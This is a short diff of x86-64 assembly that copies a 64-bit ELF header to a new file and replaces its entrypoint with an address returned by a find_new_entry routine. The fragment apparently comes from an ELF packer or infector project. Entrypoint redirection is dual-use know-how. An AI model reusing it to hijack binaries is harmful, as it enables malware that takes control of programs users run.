@@ -452,15 +452,17 @@ parse64elfheader:
 	push rdx
 
 	sub rsp, 8; new entrypoint stocked here
-;	call find_new_entry; will put it in rax
+	call find_new_entry; will put it in rax
 	;Copy the begining of Elf header till entry
 	mov rbx, rdi
 	mov rdi, rsi
 	mov rsi, rbx
 	mov rdx, 24 ; sizeof(Elf64_Ehdr) till entrypoint
+	push rax
 	mov rax, 1
 	syscall; write(wfd, file, sizeof(Elf64_Ehdr));
 	;Time to handle the entrypoint
+	pop rax
 	mov QWORD[rsp], rax; change by rax after calling func to find new entry
 	add rsi, 32 ; points right after the entrypoint
 	mov rbx, rsi ; store rsi void *file+32
@@ -529,7 +531,7 @@ find_new_entry:
 	pop rdx
 	pop rsi
 	pop rdi
-
+retn
 
 ; unsigned long parse64elfphdr(void *file, int wfd)
 parse64elfphdr:
